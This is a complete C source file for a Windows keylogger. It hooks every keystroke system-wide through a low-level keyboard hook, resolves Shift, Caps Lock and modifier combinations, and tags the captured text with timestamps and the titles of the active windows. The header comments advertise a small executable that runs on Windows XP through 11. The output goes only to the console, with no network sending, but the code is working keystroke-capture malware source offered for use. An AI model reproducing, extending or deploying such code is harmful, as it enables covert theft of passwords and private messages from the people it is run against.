// optimizes the binary to create a 143 KB exe
// adds Shift/caps detection
// Uses a Direct Binary Search or Direct Index Array
// Pre-Format Output String Buffers (no printf calls i guess)
// Active Window Logging
// Timestamping
// Modifier Combination Logic
// does Binary Footprint Optimizations (For Ultra-Small Executables) while keeping support for win xp , 7, 8.1, 10 and 11
  
#define WIN32_LEAN_AND_MEAN
#include <windows.h>

HHOOK _k_hook = NULL;
HWND _last_hwnd = NULL;
HANDLE _h_stdout = NULL;

// Direct index array for O(1) lookup (256 entries)
static const char* key_table[256] = { 0 };

// Pre-write console helper to eliminate CRT / printf overhead
void WriteLog(const char* text) {
    if (!_h_stdout) _h_stdout = GetStdHandle(STD_OUTPUT_HANDLE);
    if (_h_stdout && text) {
        DWORD written = 0;
        DWORD len = 0;
        while (text[len]) len++;
        WriteConsoleA(_h_stdout, text, len, &written, NULL);
    }
}

// 1. O(1) DIRECT INDEX ARRAY INITIALIZATION
void init_key_table() {
    key_table[VK_LMENU]       = "[Left Alt]";
    key_table[VK_RMENU]       = "[Right Alt]";
    key_table[VK_ESCAPE]      = "[ESC]";
    key_table[VK_TAB]         = "[TAB]\n";
    key_table[VK_RETURN]      = "[ENTER]\n";
    key_table[VK_BACK]        = "[BACKSPACE]";
    key_table[VK_SPACE]       = " ";
    key_table[VK_CAPITAL]     = "[CAPS LOCK]";
    key_table[VK_PRIOR]       = "[Page Up]";
    key_table[VK_NEXT]        = "[Page Down]";
    key_table[VK_HOME]        = "[HOME]";
    key_table[VK_END]         = "[END]";
    key_table[VK_LEFT]        = "[LEFT]";
    key_table[VK_UP]          = "[UP]";
    key_table[VK_RIGHT]       = "[RIGHT]";
    key_table[VK_DOWN]        = "[DOWN]";
    key_table[VK_INSERT]      = "[INSERT]";
    key_table[VK_DELETE]      = "[DELETE]";
    key_table[VK_LWIN]        = "[LWin]";
    key_table[VK_RWIN]        = "[RWin]";
    key_table[VK_NUMLOCK]     = "[NUMLOCK]";
    key_table[VK_SCROLL]      = "[SCROLL]";
    
    // Numpad
    key_table[VK_NUMPAD0]     = "0";
    key_table[VK_NUMPAD1]     = "1";
    key_table[VK_NUMPAD2]     = "2";
    key_table[VK_NUMPAD3]     = "3";
    key_table[VK_NUMPAD4]     = "4";
    key_table[VK_NUMPAD5]     = "5";
    key_table[VK_NUMPAD6]     = "6";
    key_table[VK_NUMPAD7]     = "7";
    key_table[VK_NUMPAD8]     = "8";
    key_table[VK_NUMPAD9]     = "9";
    key_table[VK_MULTIPLY]    = "*";
    key_table[VK_ADD]         = "+";
    key_table[VK_SUBTRACT]    = "-";
    key_table[VK_DECIMAL]     = ".";
    key_table[VK_DIVIDE]      = "/";

    // Function Keys
    key_table[VK_F1]          = "[F1]";
    key_table[VK_F2]          = "[F2]";
    key_table[VK_F3]          = "[F3]";
    key_table[VK_F4]          = "[F4]";
    key_table[VK_F5]          = "[F5]";
    key_table[VK_F6]          = "[F6]";
    key_table[VK_F7]          = "[F7]";
    key_table[VK_F8]          = "[F8]";
    key_table[VK_F9]          = "[F9]";
    key_table[VK_F10]         = "[F10]";
    key_table[VK_F11]         = "[F11]";
    key_table[VK_F12]         = "[F12]";
}

// 2. ACTIVE WINDOW LOGGING & TIMESTAMPING
void CheckActiveWindow() {
    HWND hwnd = GetForegroundWindow();
    if (hwnd != _last_hwnd) {
        _last_hwnd = hwnd;
        
        char title[256] = { 0 };
        GetWindowTextA(hwnd, title, sizeof(title) - 1);

        SYSTEMTIME st;
        GetLocalTime(&st);

        // Pre-formatted header construction without sprintf
        WriteLog("\n\n[");
        
        // Simple 2-digit pad helpers
        char timeBuf[32];
        timeBuf[0] = '0' + (st.wHour / 10);
        timeBuf[1] = '0' + (st.wHour % 10);
        timeBuf[2] = ':';
        timeBuf[3] = '0' + (st.wMinute / 10);
        timeBuf[4] = '0' + (st.wMinute % 10);
        timeBuf[5] = ':';
        timeBuf[6] = '0' + (st.wSecond / 10);
        timeBuf[7] = '0' + (st.wSecond % 10);
        timeBuf[8] = ']';
        timeBuf[9] = ' ';
        timeBuf[10] = '-';
        timeBuf[11] = ' ';
        timeBuf[12] = '\0';
        WriteLog(timeBuf);

        if (title[0] != '\0') {
            WriteLog(title);
        } else {
            WriteLog("Unknown Window");
        }
        WriteLog("\n----------------------------------------\n");
    }
}

// 3. SHIFT & SYMBOL CHARACTER RESOLUTION
char ResolveShiftSymbol(DWORD vk) {
    switch (vk) {
        case '1': return '!';
        case '2': return '@';
        case '3': return '#';
        case '4': return '$';
        case '5': return '%';
        case '6': return '^';
        case '7': return '&';
        case '8': return '*';
        case '9': return '(';
        case '0': return ')';
        case VK_OEM_1: return ':';      // ;:
        case VK_OEM_PLUS: return '+';   // =+
        case VK_OEM_COMMA: return '<';  // ,<
        case VK_OEM_MINUS: return '_';  // -_
        case VK_OEM_PERIOD: return '>'; // .>
        case VK_OEM_2: return '?';      // /?
        case VK_OEM_3: return '~';      // `~
        case VK_OEM_4: return '{';      // [{
        case VK_OEM_5: return '|';      // \|
        case VK_OEM_6: return '}';      // ]}
        case VK_OEM_7: return '"';      // '"
        default: return 0;
    }
}

char ResolveUnshiftedSymbol(DWORD vk) {
    switch (vk) {
        case VK_OEM_1: return ';';
        case VK_OEM_PLUS: return '=';
        case VK_OEM_COMMA: return ',';
        case VK_OEM_MINUS: return '-';
        case VK_OEM_PERIOD: return '.';
        case VK_OEM_2: return '/';
        case VK_OEM_3: return '`';
        case VK_OEM_4: return '[';
        case VK_OEM_5: return '\\';
        case VK_OEM_6: return ']';
        case VK_OEM_7: return '\'';
        default: return 0;
    }
}

// HOOK CALLBACK
LRESULT CALLBACK k_Callback1(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
        DWORD vk = key->vkCode;

        CheckActiveWindow();

        BOOL shift = (GetKeyState(VK_SHIFT) & 0x8000) || (GetKeyState(VK_LSHIFT) & 0x8000) || (GetKeyState(VK_RSHIFT) & 0x8000);
        BOOL caps = (GetKeyState(VK_CAPITAL) & 0x0001);
        BOOL ctrl = (GetKeyState(VK_CONTROL) & 0x8000) || (GetKeyState(VK_LCONTROL) & 0x8000) || (GetKeyState(VK_RCONTROL) & 0x8000);
        BOOL alt = (GetKeyState(VK_MENU) & 0x8000) || (GetKeyState(VK_LMENU) & 0x8000) || (GetKeyState(VK_RMENU) & 0x8000);

        // 4. MODIFIER COMBINATION LOGIC (e.g. [Ctrl + Alt + C])
        if ((ctrl || alt) && vk != VK_CONTROL && vk != VK_LCONTROL && vk != VK_RCONTROL &&
            vk != VK_MENU && vk != VK_LMENU && vk != VK_RMENU) {
            
            WriteLog("[");
            if (ctrl) WriteLog("Ctrl + ");
            if (alt) WriteLog("Alt + ");
            
            char cBuf[2] = { (char)vk, '\0' };
            if (vk >= 'A' && vk <= 'Z') {
                WriteLog(cBuf);
            } else if (key_table[vk]) {
                WriteLog(key_table[vk]);
            } else {
                WriteLog("KEY");
            }
            WriteLog("]");
            return CallNextHookEx(NULL, nCode, wParam, lParam);
        }

        // 5. LETTERS (SHIFT + CAPS LOCK DETECT)
        if (vk >= 'A' && vk <= 'Z') {
            BOOL isUpper = (shift ^ caps); // XOR logic for uppercase state
            char ch[2] = { (char)(isUpper ? vk : (vk + 32)), '\0' };
            WriteLog(ch);
        }
        // NUMBERS & SYMBOLS
        else if ((vk >= '0' && vk <= '9') || (vk >= VK_OEM_1 && vk <= VK_OEM_7)) {
            char ch[2] = { 0, 0 };
            if (shift) {
                ch[0] = ResolveShiftSymbol(vk);
            } else {
                if (vk >= '0' && vk <= '9') ch[0] = (char)vk;
                else ch[0] = ResolveUnshiftedSymbol(vk);
            }
            if (ch[0]) WriteLog(ch);
        }
        // MAPPED SPECIAL KEYS (Direct O(1) Table)
        else if (vk < 256 && key_table[vk]) {
            WriteLog(key_table[vk]);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main() {
    init_key_table();

    _k_hook = SetWindowsHookExA(WH_KEYBOARD_LL, k_Callback1, GetModuleHandleA(NULL), 0);
    
    MSG msg;
    while (GetMessageA(&msg, NULL, 0, 0) != 0) {
        TranslateMessage(&msg);
        DispatchMessageA(&msg);
    }

    if (_k_hook) UnhookWindowsHookEx(_k_hook);
    return 0;
}
